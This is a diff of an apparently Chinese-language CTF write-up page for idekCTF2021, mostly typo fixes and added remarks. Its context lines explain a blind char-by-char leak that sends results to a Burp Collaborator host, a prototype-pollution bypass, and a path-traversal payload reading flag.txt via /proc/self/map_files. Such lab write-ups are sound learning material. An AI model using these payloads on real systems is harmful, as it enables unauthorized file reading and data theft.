@@ -4,7 +4,7 @@
 <meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
 <title>AmiaaaZ's Site | idekCTF2021 Wp</title>
 <meta name=viewport content="width=device-width,minimum-scale=1">
-<meta name=generator content="Hugo 0.91.1">
+<meta name=generator content="Hugo 0.91.2">
 <meta name=ROBOTS content="INDEX, FOLLOW">
 <link href=/dist/app.css rel=stylesheet>
 <script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
@@ -486,7 +486,7 @@
 <p>我一开始在python的SSTI部分浪费了一部分时间，想着明明没有过滤为什么不能执行命令，后来才知道考点就不在这里</p>
 <p>这个题其实跟[uiuCTF2021]YANA很像，也是纯client-side安全问题和char-by-char思想的运用，而更方便的是这里连回显方式都十分明确：含有指定内容的note存在则渲染success.png 不存在则不渲染，并且这个图片我们可以指定，那将其设为我们自己服务器上的图片，并char-by-char的盲注查询字符就可以得到flag的内容了，就像这样</p>
 <pre tabindex=0><code>http://fancy-notes.chal.idek.team/fancy?q=idekctf{&amp;image=http://5agyjdbu3db0w6e7n60w52wbq2wskh.burpcollaborator.net/
-</code></pre><p>不够并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？</p>
+</code></pre><p>不过并没有这么轻松，app.py中限制了除q参数以外的参数字符不超过1，如何绕过呢？</p>
 <p>肥肠的鸡贼，在fancy.html中引入了一个外部的js脚本</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=color:#111>&lt;</span><span style=color:#f92672>script</span> <span style=color:#75af00>src</span><span style=color:#f92672>=</span><span style=color:#d88200>&#34;https://raw.githack.com/stretchr/arg.js/master/dist/arg-1.4.js&#34;</span><span style=color:#111>&gt;&lt;/</span><span style=color:#f92672>script</span><span style=color:#111>&gt;</span>
 </code></pre></div><p>而这个arg.js是存在js原型污染的洞并且有现成的POC->https://github.com/BlackFan/client-side-prototype-pollution/blob/master/pp/arg-js.md</p>
@@ -663,7 +663,7 @@
 <p>利用<code>os.path.join()</code>我们可以直接得到一个不受干扰的绝对路径，类似这样</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>&gt;&gt;&gt;</span> <span style=color:#111>os</span><span style=color:#f92672>.</span><span style=color:#111>path</span><span style=color:#f92672>.</span><span style=color:#111>join</span><span style=color:#111>(</span><span style=color:#d88200>&#39;amiz/tmp&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;/etc/passwd&#39;</span><span style=color:#111>)</span>
 <span style=color:#d88200>&#39;/etc/passwd&#39;</span>
-</code></pre></div><p>上传的文件名是直接拼在<code>os.path.join</code>中的，过滤了<code>../</code>，我们可以使用<code>..././</code>的方式来绕过（过滤之后拼起来正好是<code>../</code>，可以做到路径穿越，不过文件名还会有一个<code>_</code>下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择<code>/proc/self/map_files</code></p>
+</code></pre></div><p>上传的文件名是直接拼在<code>os.path.join</code>中的，过滤了<code>../</code>，我们可以使用<code>..././</code>的方式来绕过（过滤之后拼起来正好是<code>../</code>，可以做到路径穿越，不过文件名还会有一个<code>_</code>下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择<code>/proc/self/map_files</code>（选择<code>/usr/local/lib/python3.8/http/__pycache__</code>也是可以滴）</p>
 <p>验证cookie是否合法的时候是在文件上传之后的事情，所以我们可以用我们上传的文件做public.key</p>
 <div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#111>image_data</span> <span style=color:#f92672>=</span> <span style=color:#111>uploaded_file</span><span style=color:#f92672>.</span><span style=color:#111>stream</span><span style=color:#f92672>.</span><span style=color:#111>read</span><span style=color:#111>()</span>
 <span style=color:#111>image_md5</span> <span style=color:#f92672>=</span> <span style=color:#111>hashlib</span><span style=color:#f92672>.</span><span style=color:#111>md5</span><span style=color:#111>(</span><span style=color:#111>image_data</span><span style=color:#111>)</span><span style=color:#f92672>.</span><span style=color:#111>hexdigest</span><span style=color:#111>()</span>
@@ -679,6 +679,8 @@
 <pre tabindex=0><code>output/../../../../../proc/self/map_files/../../../app/flag.txt
 </code></pre><p>这样在下载时就做到了任意文件读取，得到flag</p>
 <p>————肥肠巧妙的思路了！之前做jwt相关的题固定套路都是ssti获取key，伪造cookie就好了，而这个跟文件还有结合，之前没见过</p>
+<p>————有一个我忽略的点：由于是先保存文件再校验 所以不用管传上去报不报错都会被留存，然鹅然鹅，都有了<code>embed_file</code>函数来直接获得隐写的文件了。。。。😅小丑竟是我自己</p>
+<p>参考：<a href=https://fireshellsecurity.team/idekctf-writeups/#steghide-as-a-service>wp</a></p>
 <h2 id=miscprofanity-check>Misc/Profanity Check</h2>
 <blockquote>
 <p>once tried to filter messages for profanity using a discord bot. I failed. <code>nc profanity-check.chal.idek.team 1337</code></p>
@@ -832,7 +834,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 5977 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 6117 words in this page.
 </div>
 </div>
 </div>
